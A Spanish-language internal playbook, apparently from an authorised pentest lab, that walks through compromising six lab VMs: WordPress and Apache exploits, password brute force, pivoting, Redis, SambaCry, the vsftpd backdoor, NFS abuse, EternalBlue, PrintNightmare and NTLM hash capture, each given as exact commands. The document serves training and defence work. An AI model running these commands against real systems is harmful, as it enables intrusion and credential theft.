# Guía ATAQUE · Réplica completa del ataque (uso interno del equipo)

**Documento operativo del equipo.** Aquí está TODO lo que se hace, en orden, para replicar el ataque de punta a punta y exprimir cada vulnerabilidad plantada. El informe final NO lleva estos comandos tal cual (la guía pide nivel metodológico + evidencia); esto es la cocina interna + la demo en vivo.

## 0. Reglas de réplica (leer antes de tocar nada)

1. Alcance: `10.10.10.11:80/443` y, tras el paso 1, `10.10.10.0/24` **vía pivote**. Nada fuera de ahí.
2. Comandos de PoC siempre **inocuos** (`id`, `whoami`, `hostname`): demostrar control, no romper.
3. Sin DoS, sin cifrado/ransomware simulado, sin borrar backups (son evidencia).
4. Snapshot `previo-a-<CVE>` antes de CADA PoC. Si algo se rompe: restaurar, anotar, repetir.
5. Todo queda en la **bitácora** (§2). Sin bitácora, el hallazgo no cuenta.
6. Roles: M6 ejecuta; el dueño de cada máquina observa y confirma el impacto en su VM.

## 1. Pre-vuelo (checklist antes del día de réplica)

- [ ] Snapshots `estado-inicial-vulnerable` en M1–M5 + MitraStar listo (DHCP OFF, sin DSL) + FW solo-M1 en M2–M5.
- [ ] Desde M6: `curl -sI http://10.10.10.11` → WP 7.0.1 + `X-Powered-By: PHP/8.4.26`.
- [ ] Desde M6: `nmap -Pn -p 445 10.10.10.14` = filtered (FW de M4) y `nmap -Pn -p 445 10.10.10.11` = open.
- [ ] M1–M5 se ven entre sí (`ping` + `Test-NetConnection`).
- [ ] Bitácora creada (§2) y carpeta `~/evidence/` con subcarpetas por paso.
- [ ] Cronómetro y responsable de capturas designado.

## 2. Bitácora de evidencia (formato obligatorio)

Abrir sesión registrada y hashear todo al final:

```bash
mkdir -p ~/evidence/{paso1-m1,pivote,paso2-m2,paso3-m3,paso4-m4,paso5-m5,parcheado}
script -a ~/evidence/sesion-$(date -u +%F-%H%M).log
# ... trabajar ...
sha256sum ~/evidence/*/* > ~/evidence/hashes.txt
date -u   # timestamp visible en cada captura
```

Plantilla por hallazgo (una fila por PoC, se copia al informe §6):

| Campo | Ejemplo |
|---|---|
| ID / CVE | W1 / CVE-2026-63030 |
| Ejecutor + fecha UTC | M6, 2026-… |
| Comando / herramienta | `curl …/wp-json/batch/v1` + PoC público |
| Resultado observado | admin creado + plugin subido + `uid=33(www-data)` |
| Impacto | RCE pre-auth en M1 |
| Salto que habilita | Lectura `wp-config.php` → paso 2 (M2) |
| Evidencia | `EV-W1-01.png`, `hash:…` |
| Re-test post-parche | PoC falla, WP 7.0.2 (`EV-W1-FIX.png`) |

## 3. Paso 1 · M1 desde el exterior (abrir la puerta)

### 3.0 Recon externo (siempre primero, es evidencia)

```bash
nmap -sS -sV -O -p- --min-rate 1000 10.10.10.11 -oA ~/evidence/paso1-m1/recon-m1
curl -sI http://10.10.10.11 | grep -iE 'server|x-powered-by'
wpscan --url http://10.10.10.11 --enumerate vp,vt,u -o ~/evidence/paso1-m1/wpscan.txt
nikto -h http://10.10.10.11 -o ~/evidence/paso1-m1/nikto.txt
```

Qué anotar: Apache **2.4.49**, PHP **8.4.26**, WP **7.0.1** → correlacionar con W1/W2/W3 (§7 del doc).

### 3.1 W1 · wp2shell (CVE-2026-63030) — el golpe principal

1. Snapshot `previo-a-W1` en M1.
2. Finger: `curl -s http://10.10.10.11/wp-json/ | grep -o '"namespaces":[^]]*batch[^]]*'` (endpoint `/wp-json/batch/v1` existe).
3. PoC público contra el batch → crea admin + sube plugin → shell.
4. **Exprimir:** `id` (= `www-data`), `hostname`, leer `/var/www/wp/wp-content/uploads/` y **`wp-config.php`** (DB_HOST, usuarios, claves → munición del paso 2).
5. Capturas: request batch + admin creado + plugin + `id`. Hash.

### 3.2 W2 · PHP2Shell (CVE-2026-109618/19) — vía alternativa

1. Snapshot `previo-a-W2`.
2. PoC multipart con `PHP_SESSION_UPLOAD_PROGRESS` → `uid=33(www-data)`.
3. **Exprimir:** mismo loot que W1 + mostrar en logs de Apache los errores OOM/worker (evidencia de detección §15.4 del doc).
4. Si W1 ya dio shell, W2 se valida igual pero documentando la **segunda vía** (profundidad).

### 3.3 W3 · Apache 2.4.49 (CVE-2021-41773) — traversal/CGI

1. `curl -s http://10.10.10.11/%2e/cgi-bin/.%2e/%2e%2e/etc/passwd | head -3`
2. **Exprimir:** lectura de ficheros fuera del docroot (p. ej. `wp-config.php` por otra vía) o RCE si CGI está activo.
3. Captura del `root:x:0:0` filtrado = prueba de traversal.

### 3.4 W4 · Clave débil (configuración)

1. `wpscan --url http://10.10.10.11 --passwords /usr/share/wordlists/rockyou.txt --max-threads 2` (ventana corta, con autorización).
2. **Exprimir:** login wp-admin → editor de plugins/temas → shell (vía alterna a W1).
3. Cierre del paso 1: **tres vías distintas al mismo shell** → tabla comparativa para el informe.

### 3.5 Atajos de configuración (pasada rápida, 5 min, gran valor)

```bash
curl -s http://10.10.10.11/server-status | head -5   # W5: workers/requests visibles
curl -s http://10.10.10.11/info.php | grep -i 'PHP Version'  # W6: versión regalada
curl -s http://10.10.10.11/wp-content/uploads/ | grep -ci href  # W7: listado
```

**Exprimir:** W5 muestra qué endpoints se golpean (útil para afinar PoC); W6 confirma la versión vulnerable sin adivinar; W7 permite **enumerar y descargar** backups/plugins subidos. Captura de cada una: son las más rápidas de evidenciar.

## 4. Pivote M1 → LAN interna (sin esto no hay pasos 2–5)

Elegir UNA vía (documentarla) y verificarla:

```bash
# Vía A (Metasploit): tras session en M1
route add 10.10.10.0/24 <SESSION_ID>
# /etc/proxychains4.conf -> socks5 127.0.0.1 1080 ; proxychains nmap -sT -p 445,6379 10.10.10.12

# Vía B (ligolo-ng): ./agent en M1 + en Kali: session, "start --tun", ip route add 10.10.10.0/24 dev ligolo

# Vía C (sshuttle, si hay SSH+cred en M1): sshuttle -r www-data@10.10.10.11 10.10.10.0/24
```

Verificación del túnel (evidencia): `proxychains nmap -sT -p 80,445 10.10.10.14` responde. Captura.

## 5. Paso 2 · M2 (datos + Redis 10.0)

```bash
proxychains redis-cli -h 10.10.10.12 info server | grep redis_version   # 6.2.6
# D1: PoC Lua CVE-2022-0543 -> shell como redis
# D2: mysql -h 10.10.10.12 -u wp_user -p'ClaveDebil123' -> SHOW DATABASES; volcado wp_db
proxychains nmap -sT -p 3306,6379 10.10.10.12   # D3: puertos abiertos a la LAN
```

**Exprimir:** credenciales de `wp-config.php` reutilizadas, contenido de `moodle_db` (usuarios/cursos), config de Redis → host M2 comprometido = volcado completo. Extra de config:

```bash
proxychains onesixtyone 10.10.10.12 public                    # D4: existe SNMP
proxychains snmpwalk -v2c -c public 10.10.10.12 system | head  # D4: enumera SO/uptime
proxychains snmpset -v2c -c private 10.10.10.12 sysContact.0 s pwned  # D4: ¡escritura!
```

Capturas + hash del volcado (cuidar datos ficticios).

## 6. Paso 3 · M3 (backups = las llaves del reino)

```bash
proxychains ftp 10.10.10.13                       # B3: anonymous/anonymous -> ls backups/
proxychains smbclient -L //10.10.10.13 -N         # B1: enum Samba 4.5.10
# B2: usuario "USER :)" + PASS x -> nc 10.10.10.13 6200 -> shell root (vía pivote)
# B1: PoC SambaCry is_known_pipename -> shell
proxychains nmap -sT --script smb-protocols,ftp-anon 10.10.10.13
```

**Exprimir:** descargar `credenciales.txt` y los dumps → **claves de M4/M5** = habilitan pasos 4–5. Extra de config (B4):

```bash
proxychains showmount -e 10.10.10.13          # B4: ver exportación con no_root_squash
# Vía pivote con shell root en Kali:
sudo mkdir -p /mnt/x && sudo mount -t nfs 10.10.10.13:/srv/storage/backups /mnt/x
sudo touch /mnt/x/ROOT_FUE_AQUI.txt && ls -l /mnt/x/   # dueño root remoto = prueba
```

Esta es LA evidencia del encadenamiento: fotografiar el archivo y el login posterior con esa misma clave.

## 7. Paso 4 · M4 (privesc obligatorio → SYSTEM)

```bash
proxychains nmap -sT --script smb-vuln-ms17-010 -p 445 10.10.10.14   # S1 vulnerable
# S1: ms17_010_eternalblue (RHOST 10.10.10.14, vía pivote) -> shell SYSTEM
# S3: nxc smb 10.10.10.14 -u Administrator -p '<CLAVE_DEBIL>' --shares -> legacy
# S2: PoC PrintNightmare desde sesión baja -> SYSTEM (privesc documentado paso a paso)
whoami   # debe decir: nt authority\system
```

**Exprimir:** `whoami` = SYSTEM, `ipconfig`, `net user`, contenido de `C:\LegacyShare`, hashes SAM (solo hash, no cracking fuera de alcance). Extra de config:

```bash
proxychains dig axfr uni.lab @10.10.10.14 +short | head -20   # S4: zona completa
proxychains nmap -sT --script smb-security-mode -p 445 10.10.10.14  # S5: signing disabled
# S5 demo: Responder -I <iface-pivote> captura el hash NetNTLM de la VM (controlado)
```

Captura del `nt authority\system` = la diapositiva estrella de la demo.

## 8. Paso 5 · M5 (cierre: las 6 máquinas)

```bash
proxychains nmap -sT --script smb-vuln-ms17-010 -p 445 10.10.10.15  # C1
# C2: nxc smb 10.10.10.15 -u Administrador -p '<MISMA_CLAVE>' -> acceso (reúso M4)
# C1: ms17_010_eternalblue -> shell ; C3: inventario software viejo + RDP
proxychains nmap -sT --script vnc-info -p 5900 10.10.10.15         # C4: VNC abierto
# C4 demo en vivo: vncviewer 10.10.10.15 (vía pivote) -> ESCRITORIO sin clave
```

**Exprimir:** acceso a la estación del "usuario" = alcance total. Llenar la tabla §9.

## 9. Verificación de alcance total (la tabla que evalúa §15)

| Máquina | Prueba de compromiso | Resultado | Evidencia |
|---|---|---|---|
| M1 | shell `www-data` (W1/W2/W3) | Sí/No | `EV-…` |
| M2 | shell/lectura BD (D1/D2) | Sí/No | `EV-…` |
| M3 | shell/leer backups (B1/B2/B3) | Sí/No | `EV-…` |
| M4 | `nt authority\system` (S1/S2/S3) + AXFR/signing (S4/S5) | Sí/No | `EV-…` |
| M5 | acceso estación (C1/C2) + escritorio VNC (C4) | Sí/No | `EV-…` |
| M6 | puesto auditor | N/A | bitácora + hashes |

Todo "Sí" = objetivo cumplido. Lo que quede en "No" se documenta como limitación + reintento.

## 10. Limpieza y restauración

1. Cerrar sesiones/túneles (`jobs -K`, detener agente ligolo, `exit` del `script`).
2. Restaurar `estado-inicial-vulnerable` si se hará la demo; o avanzar a parcheo (Fase 5).
3. Verificar servicios arriba: `curl -I http://10.10.10.11`, `ping` interno, `Get-SmbMapping` en M4 si aplica.
4. `sha256sum` final de `~/evidence/` y copia al coordinador.

## 11. Guion de réplica en vivo (obligatorio §12 de la guía)

1. **Diapositiva previa:** qué se muestra (p. ej. "W1 wp2shell en M1 → shell www-data"), en qué máquina, qué se espera ver.
2. Restaurar `estado-inicial-vulnerable` (M1) en vivo.
3. Ejecutar SOLO el PoC elegido (2–3 min): finger → PoC → `id`.
4. Mostrar `estado-parcheado`: mismo PoC falla + `wp core version` 7.0.2.
5. Cada integrante explica su máquina (tabla §3 del doc).

## 12. Qué va al informe y qué queda aquí

| Al informe (§11 guía) | Se queda en este playbook |
|---|---|
| Técnica a nivel metodológico + impacto | Comandos exactos y flags |
| Evidencia fechada + hash | Sesiones `script` completas |
| Referencia NVD + CVSS verificado | PoC público usado (nombre/fuente) |
| Antes/después por hallazgo | Atajos, reintentos y errores |

> Regla ética: este playbook solo existe dentro del laboratorio autorizado. No sale del equipo, no se publica, no se usa fuera (§14 de la guía).
